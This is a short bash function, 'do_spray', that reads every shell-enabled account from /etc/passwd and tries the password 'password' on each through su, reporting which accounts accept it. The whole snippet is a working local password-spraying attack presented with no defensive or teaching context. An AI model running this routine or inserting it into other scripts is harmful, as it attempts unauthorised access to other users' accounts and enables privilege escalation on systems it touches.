do_spray() {
    users=$(awk -F: '$NF ~ /sh$/ {print $1}' /etc/passwd)
    for user in $users; do
        echo "password" | su $user -c 'whoami' 2>/dev/null
    done
}
